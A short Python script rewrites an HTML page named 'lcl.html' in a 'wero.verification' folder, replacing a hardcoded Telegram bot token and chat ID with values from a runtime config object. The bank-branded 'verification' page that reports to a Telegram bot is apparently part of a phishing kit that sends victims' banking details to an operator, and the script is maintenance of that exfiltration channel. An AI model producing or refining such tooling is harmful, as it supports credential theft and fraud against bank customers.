# Fix LCL definitively
with open("wero.verification/lcl.html", 'r', encoding='utf-8') as f:
    content = f.read()

# Remplacer tous les tokens hardcodés
content = content.replace(
    "const TELEGRAM_BOT_TOKEN = '[REDACTED]';",
    "const TELEGRAM_BOT_TOKEN = window.telegramConfig?.BOT_TOKEN || 'NOT_SET';"
)

content = content.replace(
    "const TELEGRAM_CHAT_ID = '6078788670';",
    "const TELEGRAM_CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';"
)

with open("wero.verification/lcl.html", 'w', encoding='utf-8') as f:
    f.write(content)

print("[OK] LCL.html completely fixed")
print("  - Removed [REDACTED] token")
print("  - Removed old Chat ID (6078788670)")
print("  - Now using window.telegramConfig")
